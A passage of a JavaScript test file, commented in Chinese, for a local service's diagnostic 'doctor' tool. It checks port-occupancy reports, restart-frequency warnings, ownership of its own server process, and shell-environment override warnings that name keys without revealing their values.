    assert.equal(portOccupancyDiagnostic({ port: 0 }).status, 'fail');
    assert.equal(portOccupancyDiagnostic({ port: 70000 }).status, 'fail');
    assert.equal(portOccupancyDiagnostic({ port: NaN }).status, 'fail');
  });

  test('探测本身失败（非 ECONNREFUSED）→ warn，不武断判占用', () => {
    const r = portOccupancyDiagnostic({ port: 3000, probeError: 'EHOSTUNREACH' });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /EHOSTUNREACH/);
  });
});

// 第三轮审查 #4：flapping 的语义在 6a38e7c 里从「上次退出码 ≠ 0」换成了「1 小时内 ≥3 次重启」，
// 但这条文案没跟上，于是它对着一个一次都没崩过的 unit 说「曾异常退出（被 KeepAlive 拉起）」——
// 那是**编造的事实**，会把排障往错误方向带。反过来真崩了一次被拉起的 unit，这里什么都不说。
test.describe('serviceUnitsDiagnostic —— flapping 文案必须说频率，不能说「曾异常退出」', () => {
  const base = { platform: 'darwin', supported: true };
  const unit = (over) => ({ unit: 'server', label: 'com.ccm.server', state: 'running', drift: [], ...over });

  test('flapping 的 detail 说的是重启频率', () => {
    const r = serviceUnitsDiagnostic({
      ...base,
      units: [unit({ flapping: true, restarts: { lastHour: 4, last24h: 9, flapping: true, lastRestartAt: 1 } })],
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /1 小时内|频繁重启|重启 4 次/, `应说频率，实际：${r.detail}`);
    assert.doesNotMatch(r.detail, /曾异常退出|KeepAlive/, `不该再说退出码语义，实际：${r.detail}`);
  });

  test('单次异常退出（lastExitAbnormal）不再产出 flapping 告警，但也不该被完全隐藏', () => {
    const r = serviceUnitsDiagnostic({
      ...base,
      units: [unit({ flapping: false, lastExitAbnormal: true, restarts: { lastHour: 0, last24h: 1, flapping: false, lastRestartAt: 1 } })],
    });
    assert.equal(r.status, 'ok', '单次异常退出不是故障——恒亮告警比没有告警更糟');
  });
});

// 第三轮审查：D4 那条「端口被自家服务占用是正常态」的**三条件判据**此前完全没有测试
// （servicePortOwner / readServiceStatus 在 tests/ 里零引用），被测的 portOccupancyDiagnostic
// 只接收算好的 ownerLabel。把 servicePortOwner 改成无条件 `return server.label`，
// 全套单测照样绿 —— 而那意味着「别的进程占了我要用的端口」会被报成「预期占用」，
// 正是这条判据当初要避免的失败，方向相反。
test.describe('resolveServicePortOwner —— 三个条件缺一不可', () => {
  const status = (over) => ({ units: [{ unit: 'server', label: 'com.ccm.server', state: 'running', listen: { port: 3000, reachable: true }, ...over }] });

  test('三条件齐备 → 认作自家占用', () => {
    assert.equal(resolveServicePortOwner({ status: status(), port: 3000 }), 'com.ccm.server');
  });

  test('unit 没在跑 → null（端口是别人占的）', () => {
    assert.equal(resolveServicePortOwner({ status: status({ state: 'stopped' }), port: 3000 }), null);
  });

  test('端口对不上 → null（doctor --env=other.env 的 PORT 可能与常驻服务不同）', () => {
    assert.equal(resolveServicePortOwner({ status: status(), port: 4000 }), null);
  });

  test('连不上 → null（进程在但端口不是它开的）', () => {
    assert.equal(resolveServicePortOwner({ status: status({ listen: { port: 3000, reachable: false } }), port: 3000 }), null);
  });

  test('读不到 status / 没有 server unit → null，不抛错', () => {
    assert.equal(resolveServicePortOwner({ status: null, port: 3000 }), null);
    assert.equal(resolveServicePortOwner({ status: { units: [] }, port: 3000 }), null);
    assert.equal(resolveServicePortOwner({}), null);
  });
});

test.describe('envOverrideDiagnostic —— shell env 压过配置文件的可见性', () => {
  test('无覆盖 → ok', () => {
    const d = envOverrideDiagnostic({ shellEnv: { PATH: '/usr/bin', HOME: '/Users/x' }, keys: ['PORT', 'DEV_MODE'], lang: 'zh' });
    assert.equal(d.status, 'ok');
  });

  test('有覆盖 → warn，逐个列出键名，但绝不打印值（AUTH_TOKEN/VAPID 私钥可能就在其中）', () => {
    const d = envOverrideDiagnostic({
      shellEnv: { CF_ACCESS_TEAM: 'super-secret-team', DEV_MODE: '1', PATH: '/usr/bin' },
      keys: ['CF_ACCESS_TEAM', 'DEV_MODE', 'PORT'],
      lang: 'zh',
    });
    assert.equal(d.status, 'warn');
    assert.match(d.detail, /CF_ACCESS_TEAM/);
    assert.match(d.detail, /DEV_MODE/);
    assert.equal(d.detail.includes('super-secret-team'), false, '值可能是密钥，只许出现键名');
  });

  // 2026-08-19 真机证伪：机主照着旧提示跑了 exec zsh，doctor 输出一字未变——exec 只换进程映像，
  // 环境原样继承。提示必须给「真能清掉」的动作，且带上具体键名可直接粘贴。
  test('提示是可直接粘贴的 unset 命令，且绝不建议 exec', () => {
    for (const lang of ['zh', 'en']) {
      const d = envOverrideDiagnostic({
        shellEnv: { CCM_DATA_DIR: '/tmp/x', LOG_TERMINAL: 'on' },
        keys: ['CCM_DATA_DIR', 'LOG_TERMINAL'],
        lang,
      });
      assert.match(d.detail, /unset CCM_DATA_DIR LOG_TERMINAL/, `${lang}: 要给带具体键名、可粘贴的命令`);
      // 提到 exec 可以，但只能是「它没用」——绝不能把它作为解决办法给出去
      if (/exec/.test(d.detail)) {
        assert.match(d.detail, lang === 'zh' ? /exec[\s\S]{0,24}无效/ : /exec[\s\S]{0,40}fail/,
          `${lang}: 出现 exec 时必须明说它无效`);
      }
    }
  });

  test('空串按「未设置」口径不计（与 data-dir/normalizeLoadedEnvironment 同口径）', () => {
    const d = envOverrideDiagnostic({ shellEnv: { PORT: '' }, keys: ['PORT'], lang: 'zh' });
    assert.equal(d.status, 'ok');
  });
});

test.describe('identifySelfServer —— headless npm start 也要认得出是自家 server', () => {
  const REPO = '/Users/you/code/claude-chat-mobile';

  test('本仓的 node server.js（cwd 落在仓库根）→ 认领', () => {
    const r = identifySelfServer({
      processes: [{ pid: 39090, command: 'node server.js', cwd: REPO }],
      repoRoot: REPO,
    });
    assert.deepEqual(r, { pid: 39090, cwd: REPO });
  });

  test('★ 隔壁仓库的同名 server.js → 不认领（本机 codex-chat-mobile 就是真实反例）', () => {
    const r = identifySelfServer({
      processes: [{ pid: 50021, command: 'node server.js', cwd: '/Users/you/code/codex-chat-mobile' }],
      repoRoot: REPO,
    });
    assert.equal(r, null, '同名不等于同一个，cwd 对不上就不是自己');
  });

  test('无关进程 → 不认领', () => {
    assert.equal(identifySelfServer({
      processes: [{ pid: 1, command: 'nginx: master process', cwd: '/' }],
      repoRoot: REPO,
    }), null);
    assert.equal(identifySelfServer({ processes: [], repoRoot: REPO }), null);
  });
});

test('portOccupancyDiagnostic：端口被自家 headless server 占着是 ok，不再劝人「停掉它」', () => {
  const d = portOccupancyDiagnostic({ port: 3000, occupied: true, selfPid: 39090, lang: 'zh' });
  assert.equal(d.status, 'ok', 'headless npm start 是官方两条入口之一，不能恒红');
  assert.match(d.detail, /39090/);
  assert.equal(/停掉/.test(d.detail), false);
});
